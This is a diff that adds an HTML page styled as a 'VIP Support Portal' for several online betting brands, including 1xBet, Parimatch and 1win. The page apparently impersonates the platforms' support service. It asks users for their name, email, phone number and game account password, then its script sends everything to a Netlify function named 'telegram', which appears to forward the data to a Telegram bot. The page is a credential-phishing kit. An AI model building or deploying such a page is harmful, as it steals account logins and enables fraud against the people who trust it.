@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP Support Portal</title>
+    <style>
+        body {
+            background-color: #0a0a0c;
+            color: #ffd700;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #1a1a21;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #ffd700;
+            text-align: center;
+        }
+        h2 {
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #ffd700;
+            padding-bottom: 10px;
+        }
+        label {
+            display: block;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        select, input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border-radius: 5px;
+            border: 1px solid #ffd700;
+            background-color: #0a0a0c;
+            color: #ffffff;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 20px;
+            border-radius: 5px;
+            border: none;
+            background-color: #ffd700;
+            color: #0a0a0c;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+        button:hover {
+            background-color: #ffcc00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>👑 VIP SUPPORT 👑</h2>
+        <p style="text-align: center; font-weight: bold;">&gt;FULL TRUST&lt;</p>
+        <form name="support-form" method="POST" data-netlify="true">
+            <label>Select Game:
+                <select name="game" required>
+                    <option value="" disabled selected>--Select--</option>
+                    <option value="4rabet">4rabet</option>
+                    <option value="Crore Bet">Crore Bet</option>
+                    <option value="Stark Bet">Stark Bet</option>
+                    <option value="Parimatch">Parimatch</option>
+                    <option value="Lucky Star">Lucky Star</option>
+                    <option value="Valor Bet">Valor Bet</option>
+                    <option value="1win">1win</option>
+                    <option value="Desi Casino">Desi Casino</option>
+                    <option value="TopX">TopX</option>
+                    <option value="1xBet">1xBet</option>
+                    <option value="Batery Bet">Batery Bet</option>
+                </select>
+            </label>
+            <label>Full Name:
+                <input type="text" name="full_name" required>
+            </label>
+            <label>Email Address:
+                <input type="email" name="email_address" required>
+            </label>
+            <label>Mobile Number:
+                <input type="tel" name="mobile_number" required>
+            </label>
+            <label>Game Password:
+                <input type="password" name="game_password" required>
+            </label>
+            <label>Amount:
+                <input type="number" name="amount" required>
+            </label>
+            <label>Problem Type:
+                <select name="problem_type" required>
+                    <option value="" disabled selected>--Select Problem--</option>
+                    <option value="ID verification">ID verification</option>
+                    <option value="Withdrawal processing">Withdrawal processing</option>
+                    <option value="Deposit issue">Deposit issue</option>
+                    <option value="Login problem">Login problem</option>
+                    <option value="Bonus issue">Bonus issue</option>
+                    <option value="Other">Other</option>
+                </select>
+            </label>
+            <button type="submit">SUBMIT REQUEST</button>
+        </form> <script>
+  const form = document.querySelector('form');
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData.entries());
+
+    try {
+      const response = await fetch('/.netlify/functions/telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data),
+      });
+
+      if (response.ok) {
+        alert('Request submitted successfully!');
+        form.reset();
+      } else {
+        alert('Failed to submit request.');
+      }
+    } catch (error) {
+      alert('An error occurred.');
+    }
+  });
+</script>
+
+    </div>
+</body>
+</html>
